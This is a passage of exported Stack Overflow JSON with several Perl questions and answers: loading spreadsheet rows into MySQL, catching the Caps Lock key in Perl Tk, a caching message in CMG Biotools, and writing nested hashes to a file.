"simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1462866133, "post_id": 37131617, "comment_id": 61803776, "body": "The vertical things are called <i>columns</i>. The lines are the <i>rows</i>. The whole thing together is a <i>table</i>."}], "answers": [{"comments": [{"owner": {"reputation": 235, "user_id": 2642601, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/e6c5608a430d1611a0bf9b4209d48dbb?s=128&d=identicon&r=PG", "display_name": "user2642601", "link": "https://stackoverflow.com/users/2642601/user2642601"}, "edited": false, "score": 1, "creation_date": 1462866437, "post_id": 37132168, "comment_id": 61803952, "body": "I&#39;ve understand my mistake , now it&#39;s working properly. Thank you !"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 1, "last_activity_date": 1462866079, "creation_date": 1462866079, "answer_id": 37132168, "question_id": 37131617, "link": "https://stackoverflow.com/questions/37131617/perl-read-from-xls-insert-to-mysql/37132168#37132168", "title": "Perl read from xls insert to mysql", "body": "<p>You are opening a file called <code>test</code> for append writing <em>for every single cell</em> in the document. You then add the current cell's value, followed by a tabulator <code>\\t</code> character. Afterwards you open and read that same file line by line (but there is only one line), <code>chomp</code> off a line ending that is not there (because you didn't put one) and <code>split</code> on whitespace, <a href=\"http://perldoc.perl.org/functions/split.html\" rel=\"nofollow\">because <code>split</code> without a delimiter uses <code>\\s</code></a>, which is <strong>a single whitespace</strong>. </p>\n\n<blockquote>\n  <p>If omitted, PATTERN defaults to a single space, \" \" , triggering the previously described awk emulation.</p>\n</blockquote>\n\n<p>And that's exactly the problem, because your file looks like this:</p>\n\n<pre><code>John\\tSmith\\tUSA\\tOgnyan\\tPenkov\\tEgypt\n</code></pre>\n\n<p>The <code>\\t</code> are <em>single whitespaces</em>, so you end up with <code>@val</code> being all of those. And if you pass that to your query, it fails.</p>\n\n<p>Since you do not, as you say, have a table for names and a table for countries, but instead all you do is put the data from the Excel file into a single MySQL table <em>row by row</em>, you can just do that in your <code>$row</code> loop.</p>\n\n<pre><code>for my $worksheet ( $workbook-&gt;worksheets() ) {\n    my ( $row_min, $row_max ) = $worksheet-&gt;row_range();\n    my ( $col_min, $col_max ) = $worksheet-&gt;col_range();\n\n    for my $row ( $row_min .. $row_max ) {\n        my @values;\n        for my $col ( $col_min .. $col_max ) {\n            my $cell = $worksheet-&gt;get_cell( $row, $col );\n            next unless $cell;\n            push @values, $cell-&gt;value();\n        }\n        $sth-&gt;execute(@values) or die $dbh-&gt;errstr;\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 235, "user_id": 2642601, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/e6c5608a430d1611a0bf9b4209d48dbb?s=128&d=identicon&r=PG", "display_name": "user2642601", "link": "https://stackoverflow.com/users/2642601/user2642601"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 844, "favorite_count": 0, "accepted_answer_id": 37132168, "answer_count": 1, "score": 1, "last_activity_date": 1462866079, "creation_date": 1462864322, "last_edit_date": 1462865953, "question_id": 37131617, "link": "https://stackoverflow.com/questions/37131617/perl-read-from-xls-insert-to-mysql", "title": "Perl read from xls insert to mysql", "body": "<p>I'm am pretty new to Perl and I'm writing a Perl script to read data from xls and insert the results to MySQL DB but i have problem... \nhere is my code:</p>\n\n<pre><code>#!/usr/local/bin/perl\nuse strict;\nuse warnings;\nuse diagnostics;\nuse Spreadsheet::ParseExcel;\nuse DBI;\nuse Data::Dumper qw(Dumper);\nmy $parser   = Spreadsheet::ParseExcel-&gt;new();\nmy $workbook = $parser-&gt;parse('test.xls');\nmy $dbh = DBI-&gt;connect(\"dbi:mysql:parser\", \"root\", \"123qwe\", { RaiseError =&gt; 1}) or die $DBI::errstr;\nmy $query = 'INSERT INTO parser (Name,Country) VALUES (?,?)';\nmy $sth = $dbh-&gt;prepare($query) or die \"Prepare failed: \" . $dbh-&gt;errstr();\n\nif ( !defined $workbook ) {\n        die $parser-&gt;error(), \".\\n\";\n}\nfor my $worksheet ( $workbook-&gt;worksheets() ) {\n        my ( $row_min, $row_max ) = $worksheet-&gt;row_range();\n        my ( $col_min, $col_max ) = $worksheet-&gt;col_range();\n\n        for my $row ( $row_min .. $row_max ) {\n                for my $col ( $col_min .. $col_max ) {\n\n                        my $cell = $worksheet-&gt;get_cell( $row, $col );\n                        next unless $cell;\n                        my $results = $cell-&gt;value();\n                        open(my $fh, '&gt;&gt;', \"test\");\n                        print $fh \"$results\\t\";\n                        close $fh;\n                }\n        }\n}\n\nopen my $fh, \"&lt;\", \"test\" or die $!;\nwhile (&lt;$fh&gt;)\n{\n        chomp;\n        my @vals = split;\n        $sth-&gt;execute(@vals);\n}\nclose $fh;\n</code></pre>\n\n<p>So when i execute the script it ends with the following error:</p>\n\n<pre><code>DBD::mysql::st execute failed: called with 6 bind variables when 2 are needed at ./parser.pl line 39, &lt;$fh&gt; line 1.\nUncaught exception from user code:\n    DBD::mysql::st execute failed: called with 6 bind variables when 2 are needed at ./parser.pl line 39, &lt;$fh&gt; line 1.\n</code></pre>\n\n<p>Which is natural because i have indeed 6 variables in the output:</p>\n\n<pre><code>John Smith  USA Ognyan Penkov   Egypt\n</code></pre>\n\n<p>So the problem is that i cant seem to find a way to split the results from every column/row and put them in the MySQL tables because the Spreadsheet::ParseExcel reads all the date as 1 row.(For example the names must go to table Name and the country to table country)</p>\n\n<p>My XLS file looks like this:</p>\n\n<pre><code>       A           B\n1. John Smith     USA\n2. Ognyan Penkov  Egypt\n...etc...\n</code></pre>\n\n<p>My MySQL tables:</p>\n\n<pre><code>+--------+--------------+------+-----+---------+----------------+\n| Field  | Type         | Null | Key | Default | Extra          |\n+--------+--------------+------+-----+---------+----------------+\n| id     | int(6)       | NO   | PRI | NULL    | auto_increment |\n| Name   | varchar(255) | YES  |     | NULL    |                |\n|Country | varchar(255) | YES  |     | NULL    |                |\n+--------+--------------+------+-----+---------+----------------+\n</code></pre>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 4237, "user_id": 797308, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/e6e98fb28139b207c708da19e50ce00a?s=128&d=identicon&r=PG", "display_name": "NirMH", "link": "https://stackoverflow.com/users/797308/nirmh"}, "edited": false, "score": 0, "creation_date": 1463297532, "post_id": 37164852, "comment_id": 62000469, "body": "I tried your example and still , nothing is printed. i am using a Microsoft keyboard, Can that make the difference?"}, {"owner": {"reputation": 174, "user_id": 5889745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c6e1d09e53789c17ad12bef08a52e3e?s=128&d=identicon&r=PG&f=1", "display_name": "Jorgen", "link": "https://stackoverflow.com/users/5889745/jorgen"}, "reply_to_user": {"reputation": 4237, "user_id": 797308, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/e6e98fb28139b207c708da19e50ce00a?s=128&d=identicon&r=PG", "display_name": "NirMH", "link": "https://stackoverflow.com/users/797308/nirmh"}, "edited": false, "score": 0, "creation_date": 1463320371, "post_id": 37164852, "comment_id": 62007126, "body": "It prints it in the DOS box that opens when you execute the program. I have just tested it on a Windows machine. However, it is state 8 and 10 on Windows and the keycode is 20.  I live and learn! :)"}, {"owner": {"reputation": 4237, "user_id": 797308, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/e6e98fb28139b207c708da19e50ce00a?s=128&d=identicon&r=PG", "display_name": "NirMH", "link": "https://stackoverflow.com/users/797308/nirmh"}, "edited": false, "score": 0, "creation_date": 1463377774, "post_id": 37164852, "comment_id": 62023331, "body": "This might explain, as i am running Linux and connecting via Xconnect. Have you tested your code on Linux machine?"}, {"owner": {"reputation": 174, "user_id": 5889745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c6e1d09e53789c17ad12bef08a52e3e?s=128&d=identicon&r=PG&f=1", "display_name": "Jorgen", "link": "https://stackoverflow.com/users/5889745/jorgen"}, "reply_to_user": {"reputation": 4237, "user_id": 797308, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/e6e98fb28139b207c708da19e50ce00a?s=128&d=identicon&r=PG", "display_name": "NirMH", "link": "https://stackoverflow.com/users/797308/nirmh"}, "edited": false, "score": 0, "creation_date": 1463380255, "post_id": 37164852, "comment_id": 62024236, "body": "Oh, yes, I only use Debian Linux for development. I do have a Windows machine but it is really only used for PhotoShop. :)  On Linux the text shows in the terminal."}, {"owner": {"reputation": 174, "user_id": 5889745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c6e1d09e53789c17ad12bef08a52e3e?s=128&d=identicon&r=PG&f=1", "display_name": "Jorgen", "link": "https://stackoverflow.com/users/5889745/jorgen"}, "reply_to_user": {"reputation": 4237, "user_id": 797308, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/e6e98fb28139b207c708da19e50ce00a?s=128&d=identicon&r=PG", "display_name": "NirMH", "link": "https://stackoverflow.com/users/797308/nirmh"}, "edited": false, "score": 0, "creation_date": 1463382676, "post_id": 37164852, "comment_id": 62025245, "body": "See my latest update above which prints the codes on the label instead. Apologies (well, not really :) for the global variable."}, {"owner": {"reputation": 174, "user_id": 5889745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c6e1d09e53789c17ad12bef08a52e3e?s=128&d=identicon&r=PG&f=1", "display_name": "Jorgen", "link": "https://stackoverflow.com/users/5889745/jorgen"}, "reply_to_user": {"reputation": 4237, "user_id": 797308, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/e6e98fb28139b207c708da19e50ce00a?s=128&d=identicon&r=PG", "display_name": "NirMH", "link": "https://stackoverflow.com/users/797308/nirmh"}, "edited": false, "score": 0, "creation_date": 1463461515, "post_id": 37164852, "comment_id": 62061338, "body": "NirMH, please confirm that you can see the keycode and state on the graphic Tk Label in the latest version. If not, you have a very interesting problem that I would like to look into."}, {"owner": {"reputation": 4237, "user_id": 797308, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/e6e98fb28139b207c708da19e50ce00a?s=128&d=identicon&r=PG", "display_name": "NirMH", "link": "https://stackoverflow.com/users/797308/nirmh"}, "edited": false, "score": 0, "creation_date": 1463491066, "post_id": 37164852, "comment_id": 62079972, "body": "Sorry, i still don&#39;t see anything printed or displayed. I believe this is somehow related to my keyboard and the &quot;Caps Lock&quot; event is not actually sent to the OS. while testing my keyboard on a windows system, i do get the event fired."}, {"owner": {"reputation": 174, "user_id": 5889745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c6e1d09e53789c17ad12bef08a52e3e?s=128&d=identicon&r=PG&f=1", "display_name": "Jorgen", "link": "https://stackoverflow.com/users/5889745/jorgen"}, "reply_to_user": {"reputation": 4237, "user_id": 797308, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/e6e98fb28139b207c708da19e50ce00a?s=128&d=identicon&r=PG", "display_name": "NirMH", "link": "https://stackoverflow.com/users/797308/nirmh"}, "edited": false, "score": 0, "creation_date": 1463494312, "post_id": 37164852, "comment_id": 62082593, "body": "Weird. I have tested my solution on several Linux systems and Windows. Like I wrote above, the solution with printing to the terminal/DOS box works fine as (of course) does the graphics text on the Tk label."}], "tags": [], "owner": {"reputation": 174, "user_id": 5889745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c6e1d09e53789c17ad12bef08a52e3e?s=128&d=identicon&r=PG&f=1", "display_name": "Jorgen", "link": "https://stackoverflow.com/users/5889745/jorgen"}, "is_accepted": true, "score": 1, "last_activity_date": 1463383033, "last_edit_date": 1463383033, "creation_date": 1462974943, "answer_id": 37164852, "question_id": 37131444, "link": "https://stackoverflow.com/questions/37131444/how-to-bind-caps-lock-key-event-in-perl-tk/37164852#37164852", "title": "How to bind &quot;Caps Lock&quot; key event in Perl Tk?", "body": "<pre><code>    use strict;\n    use warnings;\n    use Tk;\n\n\n    my $mw = MainWindow-&gt;new;\n    my $label = $mw-&gt;Label();\n    $mw-&gt;geometry(\"200x200+50+50\");\n\n    $mw-&gt;bind('&lt;Caps_Lock&gt;' =&gt; \\&amp;exit);\n    MainLoop;\n</code></pre>\n\n<p>UPDATE: You can check the keycodes and state:</p>\n\n<pre><code>    $mw-&gt;bind('&lt;Caps_Lock&gt;' =&gt;  sub { capslock($mw)});\n</code></pre>\n\n<p>and define a function of that name:</p>\n\n<pre><code>    sub capslock\n    {\n      my ($mw) = shift;\n      printf(\"keycode %d\\n\", $Tk::event-&gt;k);\n      printf(\"state %d\\n\", $Tk::event-&gt;s);\n    }\n</code></pre>\n\n<p>On Linux: The keycode is 66 and the state is 0 or 2 depending on whether set or not. For Windows: See my comment below.</p>\n\n<p>UPDATE2: You can't complain about the service :) -<br>\nthis will print the keycode and state on the label instead:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Tk;\n\nmy $mw = MainWindow-&gt;new;\nmy $codes = '';\nmy $label = $mw-&gt;Label(-font =&gt; ['courier', '12'],\n    -justify =&gt; 'left',-textvariable =&gt; \\$codes)-&gt;pack;\n$mw-&gt;geometry(\"200x200+50+50\");\n$mw-&gt;bind('&lt;Caps_Lock&gt;' =&gt;  sub { capslock($mw)});\nMainLoop;\n\nsub capslock\n{\n  my ($mw) = @_;\n\n  $codes = sprintf(\"keycode %d\\nstate %d\",\n    $Tk::event-&gt;k, $Tk::event-&gt;s);\n}\n</code></pre>\n"}], "owner": {"reputation": 4237, "user_id": 797308, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/e6e98fb28139b207c708da19e50ce00a?s=128&d=identicon&r=PG", "display_name": "NirMH", "link": "https://stackoverflow.com/users/797308/nirmh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 135, "favorite_count": 0, "accepted_answer_id": 37164852, "answer_count": 1, "score": 2, "last_activity_date": 1463383033, "creation_date": 1462863763, "question_id": 37131444, "link": "https://stackoverflow.com/questions/37131444/how-to-bind-caps-lock-key-event-in-perl-tk", "title": "How to bind &quot;Caps Lock&quot; key event in Perl Tk?", "body": "<p>Is there a way to bind the \"Caps Lock\" key event in Perl Tk?</p>\n\n<p>It looks like the key press is a keyboard hardware event, causing the keyboard to send ASCII codes for upper case letters, and not an OS feature.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462860899, "post_id": 37130523, "comment_id": 61800952, "body": "Add the code to your question. not as link to a screenshot"}, {"owner": {"reputation": 1, "user_id": 3774046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e8d7f4b25cc35c9ebfe9a871b64ab941?s=128&d=identicon&r=PG&f=1", "display_name": "user3774046", "link": "https://stackoverflow.com/users/3774046/user3774046"}, "reply_to_user": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 0, "creation_date": 1462861143, "post_id": 37130523, "comment_id": 61801054, "body": "this is the part of the complete code.... the entire code is available @ github .... the link is  <a href=\"https://github.com/thomasp85/Biotools/blob/master/blastmatrix\" rel=\"nofollow noreferrer\">github.com/thomasp85/Biotools/blob/master/blastmatrix</a>"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 3774046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e8d7f4b25cc35c9ebfe9a871b64ab941?s=128&d=identicon&r=PG&f=1", "display_name": "user3774046", "link": "https://stackoverflow.com/users/3774046/user3774046"}, "edited": false, "score": 0, "creation_date": 1462862719, "post_id": 37131013, "comment_id": 61801797, "body": "Thanks for your response Marty. The problem is that the code is working fine when the input say is around 15 to 20 files. Once the number of files increases, &quot;jobid not in cache --redoing&quot; message is displayed in the terminal after some time."}, {"owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "reply_to_user": {"reputation": 1, "user_id": 3774046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e8d7f4b25cc35c9ebfe9a871b64ab941?s=128&d=identicon&r=PG&f=1", "display_name": "user3774046", "link": "https://stackoverflow.com/users/3774046/user3774046"}, "edited": false, "score": 0, "creation_date": 1462863089, "post_id": 37131013, "comment_id": 61802010, "body": "Are you sure its based solely on the number of files?  Find a definite &quot;fail set&quot; - a bunch of files that fail every time.  Break them up into groups of 10 and run all the groups through the command separately.  If what you say is true, then all the groups should succeed but, if one of the groups fail, and fails repeatedly, you can be sure its something specific to that group of files.  Obviously, you can break the &quot;suspect&quot; group (or groups) down into smaller file sets until you isolate the problem to specific files."}], "tags": [], "owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "is_accepted": false, "score": 0, "last_activity_date": 1462862838, "last_edit_date": 1462862838, "creation_date": 1462862490, "answer_id": 37131013, "question_id": 37130523, "link": "https://stackoverflow.com/questions/37130523/cmg-biotools-a-perl-based-tool/37131013#37131013", "title": "CMG biotools - a Perl based tool", "body": "<p>Your script, <code>blastmatrix</code>, attempts to use an external (to this script) perl tool called \"cacher\" - <code>/usr/biotools/indirect/cacher</code> - passing parameters </p>\n\n<ul>\n<li><code>-action get</code> </li>\n<li><code>--source='$cache_source'</code>; and </li>\n<li><code>--id='$jobid'</code></li>\n</ul>\n\n<p>So the script is attemting to retrieve a job with ID <code>$jobid</code> from a caching utillity and its failing.  Having failed, the reference to \"redoing\" appears to be an attempt to run <code>BLASTALL</code>, that is <code>/usr/biotools/blast/bin/blastall</code>, and then retrys the same cache command.</p>\n\n<p>So, if all you are seeing is the message but the script is working then I'd guess - and that's all I can do - that <code>BLASTALL</code> is cleaning up some issue - a unexpected file, a missing file - who knows - and the second attempt at the cache is working.</p>\n\n<p>If it's not working at all, I can only say that it finally fails - which is a different thing from say \"the root cause is ...\" - when it attempts to use the cacher.</p>\n\n<p>Note - all the above is speculative.</p>\n"}], "owner": {"reputation": 1, "user_id": 3774046, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e8d7f4b25cc35c9ebfe9a871b64ab941?s=128&d=identicon&r=PG&f=1", "display_name": "user3774046", "link": "https://stackoverflow.com/users/3774046/user3774046"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 96, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463038958, "creation_date": 1462860704, "last_edit_date": 1463038958, "question_id": 37130523, "link": "https://stackoverflow.com/questions/37130523/cmg-biotools-a-perl-based-tool", "title": "CMG biotools - a Perl based tool", "body": "<pre><code>sub runBlast {\n    # order is preserved !\n    for ( my $subject_counter = 0 ; $subject_counter &lt; scalar ( @{$xmlcfg-&gt;{sources}[0]-&gt;{entry}} ) ; $subject_counter++ ) {\n        my $subjectTitle = $INFO{$subject_counter}{title};\n        my $subjectSubtitle = $INFO{$subject_counter}{subtitle};\n        for ( my $query_counter = 0 ; $query_counter &lt; scalar ( @{$xmlcfg-&gt;{sources}[0]-&gt;{entry}} ) ; $query_counter++ ) {\n            my $queryTitle = $INFO{$query_counter}{title};\n            my $querySubtitle = $INFO{$query_counter}{subtitle};\n            $tab_h{\"$query_counter-$subject_counter\"} = $cm-&gt;start();\n            unless ( $tab_h{\"$query_counter-$subject_counter\"} ) {\n                my $blastreport_scratch = \"$scratch/$query_counter-$subject_counter.blastout.gz\";\n                my $jobid = md5 ( \"$scratch/$query_counter.fsa\" , \"$scratch/$subject_counter.fsa\" ) ;\n                system \"$perl /usr/biotools/indirect/cacher --id='$jobid' --source='$cache_source' -action get &gt; $blastreport_scratch\";\n                if ( $? != 0 or $clean or -s $blastreport_scratch == 0) {\n                    print STDERR \"# jobid $jobid not in cache - redoing\\n\";\n                    my $cmd = \"$BLASTALL -F 0 -p blastp -d $scratch/$subject_counter.fsa -e 1e-5 -m 7 &lt; $scratch/$query_counter.fsa | $TIGRCUT | gawk '{print \\$1\\\"\\\\t\\\"\\$2}' | $gzip &gt; $blastreport_scratch\";\n                    system $cmd;\n                    die \"# failed at '$cmd'\\n\" if $? != 0;\n                    system \"$perl /usr/biotools/indirect/cacher --id=$jobid --source=$cache_source -action put -expire 100 &lt; $blastreport_scratch\";\n                } else {\n                        my $s = -s $blastreport_scratch;\n                        print STDERR \"# fetched jobid $jobid from cache ( $s bytes)\\n\";\n                }\n                exit;\n            }\n        }\n    }\n    $cm-&gt;wait_all_children; \n}\n</code></pre>\n\n<p>I am completely zero in Perl programming. I had to run this tool called <code>CMG Biotools</code> which has been coded in Perl. </p>\n\n<p>I am attaching part of its code here. Can anyone please tell me when <code>jobid not in cache...redoing</code> message will be displayed.<a href=\"http://i.stack.imgur.com/55ezB.png\" rel=\"nofollow\">code for CMG biotools</a></p>\n"}, {"tags": ["perl", "hash", "replace", "key"], "comments": [{"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "edited": false, "score": 0, "creation_date": 1462859106, "post_id": 37130081, "comment_id": 61800215, "body": "What happened with your RegEx? Did you get the correct value (for example via <code>print</code>)?"}, {"owner": {"reputation": 195, "user_id": 4417286, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/3dcwY.jpg?s=128&g=1", "display_name": "Raj", "link": "https://stackoverflow.com/users/4417286/raj"}, "reply_to_user": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "edited": false, "score": 0, "creation_date": 1462859410, "post_id": 37130081, "comment_id": 61800339, "body": "Yes. I am getting correct values in both hashes of hash"}], "answers": [{"comments": [{"owner": {"reputation": 195, "user_id": 4417286, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/3dcwY.jpg?s=128&g=1", "display_name": "Raj", "link": "https://stackoverflow.com/users/4417286/raj"}, "edited": false, "score": 1, "creation_date": 1462860526, "post_id": 37130348, "comment_id": 61800775, "body": "This will just write hashes of hash as it is. I want to replace value of file2 from file1. I have two such hashes of hash. This will print only values stored in hashes of hash not the lines  other than stored in hashes of hash  gets printed.  I tried this logic..I keep printing file2 as it is in file3 until I found the values. When I found the value then It will search for related values in first hashes of hash and print it in file3."}], "tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": false, "score": 0, "last_activity_date": 1462859987, "creation_date": 1462859987, "answer_id": 37130348, "question_id": 37130081, "link": "https://stackoverflow.com/questions/37130081/replace-hashes-of-hash-with-another-hashes-of-hash/37130348#37130348", "title": "Replace hashes of hash with another hashes of hash", "body": "<p>You already said that you get correct values using your RegEx, so just write them back to a file:</p>\n\n<pre><code>open my $fh3,'&gt;','file3.txt';\nprint $fh3 \"family (){\\n\";\nfor my $family (keys %data) {\n    print $fh3 \"$family () {\\n\";\n    for my $member (keys %{$data{$family_name}}) {\n        print $fh3 \"$member () {\\n\";\n        for my $age_range (keys %{$data{$family_name}}) {\n            print $fh3 \"$age_range () {\\n\".\n                  join(\n                      \"\\n\",\n                      @{$data{family_name}-&gt;{$member}-&gt;{$age_range}-&gt;{values}}\n                  ).\n                  \"}\\n\";\n        }\n        print $fh3 \"}\\n\";\n    }\n    print $fh3 \"}\\n\";\n}\nprint $fh3 \"}\\n\";\n</code></pre>\n\n<p>Loop through all levels of the structure printing everything to the file.</p>\n\n<p>Another attempt:</p>\n\n<pre><code>sub write_part {\n    my $fh = shift;\n    my $data = shift;\n\n    if (ref($data) eq 'HASH') {\n        for my $key (keys %$data) {\n            print $fh \"$key () {\\n\";\n            write_part($fh, $data-&gt;{$key});\n            print $fh \"}\\n\";\n        }\n    } elsif (ref($data) eq 'ARRAY') {\n        print $fh join(\"\\n\", @$data).\"\\n\";\n    } else {\n        print $fh $data.\"\\n\";\n    }\n}\n\nopen my $fh3, '&gt;', 'file3.txt';\nwrite_part($fh3, \\%data);\nclose $fh3;\n</code></pre>\n\n<p>The sub is called once passing the topmost data structure and calls itself whenever it gets a HashRef as <code>$data</code>.</p>\n"}], "owner": {"reputation": 195, "user_id": 4417286, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/3dcwY.jpg?s=128&g=1", "display_name": "Raj", "link": "https://stackoverflow.com/users/4417286/raj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 68, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1462859987, "creation_date": 1462858836, "question_id": 37130081, "link": "https://stackoverflow.com/questions/37130081/replace-hashes-of-hash-with-another-hashes-of-hash", "title": "Replace hashes of hash with another hashes of hash", "body": "<p>I have two hash of hashes that I created from two separate tex file. I wan to change the value of second hashes of hash with the first hashes of hash and want to write it in third file. or I can replace the value in second text file it self.</p>\n\n<p>File1:</p>\n\n<pre><code>family (){\nkapoor(){\nmember1(){\nmale(){\nbetween : 0 to 5\nperson : 2\ntheir name is bla &amp; bla. \nand bla bla......\nblaa.....\n}\n\nmale(){\nbetween : 5 to 5\nperson : 20\ntheir name is bla &amp; bla bla. \nand bla bla......\nblaa.....\n}\n}\n\nmember2(){\nmale(){\nbetween : 0 to 5\nperson : 2\ntheir name is bla &amp; bla. \nand bla bla......\nblaa.....\n}\n\nmale(){\nbetween : 5 to 5\nperson : 20\ntheir name is bla &amp; bla bla. \nand bla bla......\nblaa.....\n}\n}\n}\n\n\nrai(){\nmember1(){\nmale(){\nbetween : 0 to 5\nperson : 2\ntheir name is bla &amp; bla. \nand bla bla......\nblaa.....\n}\n\nmale(){\nbetween : 5 to 5\nperson : 20\ntheir name is bla &amp; bla bla. \nand bla bla......\nblaa.....\n}\n}\n\nmember2(){\nmale(){\nbetween : 0 to 5\nperson : 2\ntheir name is bla &amp; bla. \nand bla bla......\nblaa.....\n}\n\nmale(){\nbetween : 5 to 5\nperson : 20\ntheir name is bla &amp; bla bla. \nand bla bla......\nblaa.....\n}\n}\n}\n</code></pre>\n\n<p>hash1:</p>\n\n<pre><code>family=&gt;{\n\n     kapoor =&gt; {\n                member1=&gt;{ \n                           0 to 5=&gt; person : 2\n                                    their name is bla &amp; bla. \n                                    and bla bla......\n                                    blaa.....\n\n                          }   \n               member2=&gt; {\n                          5 to 5 =&gt; person : 20\n                                    their name is bla &amp; bla bla. \n                                    and bla bla......\n                                    blaa.....\n\n                }\n\nrai =&gt;{\n/...................etc\n}\n</code></pre>\n\n<p>hash 2 is same but value is different. </p>\n\n<p>I tried:</p>\n\n<pre><code>while(my$line=&lt;$fh&gt;)  ******** to store hashes of hash from file 1***\n  {\n\n  if($line=~/$family_name_re/)\n  {\n      $family_name=$1;\n  $family_count=$cell_count+1;\n  }\n  elsif ($line=~/$member_re/)\n  {\n  $member = $1;\n }\n  elsif ($line=~/$age_re/)\n {\n  $age_range=$1;\n\n push @{$data{$family_name}{$member}{$age_range}{values}},$line;\n  }\n}\n  print Dumper(\\%data);\n  print \"Number of cell is $cell_count\\n\";\n\n close ($fh);\n</code></pre>\n\n<p>same way I am reading from second file and storing it in hashes of hash 2.</p>\n\n<p>Any suggestion how I can replace the value? \nI tried to replace in second file but it didn't work.</p>\n\n<pre><code>$_=~s/$newvalue/$data{$family_name}{$member}{$age_range}/;\n</code></pre>\n\n<p>Instead of replacing, I think to write file2 as it is in third file and only value from first file get reflect in third file.</p>\n"}, {"tags": ["perl", "hash", "filter"], "comments": [{"owner": {"reputation": 4116, "user_id": 4402825, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-3ESJ4SrCVfE/AAAAAAAAAAI/AAAAAAAAFO8/yBWcRYAN94s/photo.jpg?sz=128", "display_name": "Ben Grimm", "link": "https://stackoverflow.com/users/4402825/ben-grimm"}, "edited": false, "score": 0, "creation_date": 1462852099, "post_id": 37128497, "comment_id": 61797966, "body": "If you can provide a rough example of what you&#39;re trying to accomplish in each sub, an appropriate solution may present itself."}], "answers": [{"tags": [], "owner": {"reputation": 548, "user_id": 1218919, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/245a9a6d7af44d3820591435f058fbd8?s=128&d=identicon&r=PG", "display_name": 